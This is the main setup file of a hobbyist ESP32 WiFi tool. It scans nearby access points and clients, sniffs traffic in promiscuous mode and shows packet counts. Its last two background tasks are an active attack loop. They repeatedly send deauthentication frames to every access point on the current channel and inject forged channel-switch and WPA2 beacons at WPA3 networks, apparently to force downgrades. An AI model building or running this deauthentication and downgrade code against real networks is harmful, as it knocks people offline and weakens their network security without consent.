#include "Arduino.h"
#include "esp_task_wdt.h"
#include "config.h"
#include "display.h"
#include "button.h"
#include "wifi.h"
#include "sd stuffs.h"
#include "mon thing.h"

using namespace std;

void setup() {
	// need to keep this order! (im lazy af to properly impliment init logging so i js use sprite.print)
    psramInit();
    esp_task_wdt_deinit();

	pinMode(21, INPUT_PULLUP);
	pinMode(22, INPUT_PULLUP);
	enableSD = digitalRead(21);
	debugPauseEnabled = !digitalRead(22);

    init_display();
	sprite.setTextColor(0x7FF0);
	sprite.setCursor(0, 0);
	printDebugWithTime("Display initialized");

    init_button();
	printDebugWithTime("Buttons initialized");

    init_log1();
	init_log2();
    printDebugWithTime("Logs initialized");

	init_packet_processor();
	printDebugWithTime("Packet processor initialized");

    init_mon();
	printDebugWithTime("Monitor initialized");

    init_wifi();
	printDebugWithTime("Wifi initialized");
	
    if (enableSD) xTaskCreatePinnedToCore([](void* _) { // init sd while wifi is scanning to save time
        init_sd();
		printDebugWithTime("SD initialized");

        vTaskDelete(NULL);
    }, "sd init", 5000, NULL, 3, NULL, 0);

    scan();
	
    waitForAnyButtonPress();
	esp_wifi_set_promiscuous(true);
	display_draw();

    xTaskCreatePinnedToCore([](void* _) {
		while (1) {
			button1.tick();
			button2.tick();
			delay(BUTTON_TICK_INTERVAL);
		}
	}, "button", BUTTON_TASK_STACK_SIZE, NULL, 3, NULL, BUTTON_TASK_CORE);

	xTaskCreatePinnedToCore([](void* _) {
		while (1) {
			delay(menuIndex ? LOG_MENU_UPDATE_INTERVAL : MAIN_MENU_UPDATE_INTERVAL);
			display_draw();
			packetCounts::packetCount = packetCounts::deauthCount = packetCounts::probeCount = packetCounts::dataCount = packetCounts::beaconCount = packetCounts::rssiTmp = 0;
		}
	}, "update", UPDATE_TASK_STACK_SIZE, NULL, 3, NULL, UPDATE_TASK_CORE);
	xTaskCreatePinnedToCore([](void* _) {
		while (1) {
			const unsigned long currentTime = millis();
			for (auto& ap : APs) {
				if (currentTime - ap.packetCounts.lastPacketUpdate >= 1000) {
					ap.rssi = (ap.packetCounts.packetCount == 0) ? ap.rssi : ap.rssiTmp / ap.packetCounts.packetCount;
					ap.rssiTmp = 0;
					ap.packetCounts.packetCount = 0;
					ap.packetCounts.lastPacketUpdate = currentTime;
				}
				for (auto& sta : ap.STAs) {
					if (currentTime - sta.packetCounts.lastPacketUpdate >= 1000) {
						sta.rssi = (sta.packetCounts.packetCount == 0) ? sta.rssi : sta.rssiTmp / sta.packetCounts.packetCount;
						sta.rssiTmp = 0;
						sta.packetCounts.packetCount = 0;
						sta.packetCounts.lastPacketUpdate = currentTime;
					}
				}
			}
			if (packetCounts::droppedPackets > 0) {
				log1(DETECTED_DROPPED_PACKETS_COLOR, "Dropped %d packets!", packetCounts::droppedPackets);
				packetCounts::droppedPackets = 0;
			}
			delay(UPDATE_TASK_INTERVAL);
		}
	}, "sta/ap update", STA_AP_UPDATE_TASK_STACK_SIZE, NULL, 3, NULL, STA_AP_UPDATE_TASK_CORE);

	pinMode(2, OUTPUT);
	xTaskCreatePinnedToCore([](void* _) { // FIXME: latter
		static unsigned long lastDeauthTime = 0;
		while (1) {
			if (deauthActive) {
				digitalWrite(2, HIGH);
				uint32_t current_time = millis();
				delay((current_time - lastDeauthTime >= DEAUTH_INTERVAL) ? 0 : (DEAUTH_INTERVAL - (current_time - lastDeauthTime)));
				for (auto& ap : APs) if (ap.channel == channels[channelIndex]) {
					sendDeauth(ap.bssid);
					if (ap.wpa3Stuffs.hasWPA3 >= 3 && ap.wpa3Stuffs.hasWPA3 == 3) esp_wifi_80211_tx(WIFI_IF_STA, ap.wpa3Stuffs.CSAbeacon, ap.wpa3Stuffs.CSAbeaconLen, false);
				}
				lastDeauthTime = millis();
			} else digitalWrite(2, LOW), delay(60);
		}
	}, "deauth", DEAUTH_TASK_STACK_SIZE, NULL, 3, NULL, DEAUTH_TASK_CORE);
	xTaskCreatePinnedToCore([](void* _) {
		static unsigned long lastDeauthTime = 0;
		while (1) {
			if (deauthActive) {
				uint32_t current_time = millis();
				delay((current_time - lastDeauthTime >= DEAUTH_INTERVAL / 4) ? 0 : (DEAUTH_INTERVAL / 4 - (current_time - lastDeauthTime)));
				for (auto& ap : APs) if (ap.channel == channels[channelIndex]) 
					if (ap.wpa3Stuffs.hasWPA3 >= 3 && ap.wpa3Stuffs.hasWPA3 == 4) esp_wifi_80211_tx(WIFI_IF_STA, ap.wpa3Stuffs.WPA2beacon, ap.wpa3Stuffs.WPA2beaconLen, false);
				lastDeauthTime = millis();
			} else delay(60);
		}
	}, "deauth 2", DEAUTH_TASK_STACK_SIZE, NULL, 3, NULL, DEAUTH_TASK_CORE);
}
void loop() { vTaskDelete(NULL); }